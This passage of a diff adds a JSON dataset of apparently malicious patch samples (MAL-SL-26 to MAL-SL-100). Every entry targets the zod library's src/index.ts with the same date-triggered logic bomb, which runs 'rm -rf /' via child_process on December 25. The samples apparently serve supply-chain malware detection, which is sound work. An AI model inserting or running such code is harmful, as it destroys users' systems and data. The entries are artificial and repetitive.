+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-26",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-27",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-28",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-29",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-30",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-31",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-32",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-33",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-34",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-35",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-36",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-37",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-38",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-39",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-40",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-41",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-42",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-43",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-44",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-45",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-46",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-47",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-48",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-49",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-50",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-51",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-52",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-53",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-54",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-55",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-56",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-57",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-58",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-59",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-60",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-61",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-62",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-63",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-64",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-65",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-66",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-67",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-68",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-69",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-70",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-71",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-72",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-73",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-74",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-75",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-76",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-77",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-78",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-79",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-80",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-81",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-82",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-83",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-84",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-85",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-86",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-87",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-88",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-89",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-90",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-91",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-92",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-93",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-94",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-95",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-96",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-97",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-98",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-99",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-100",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  }
+]
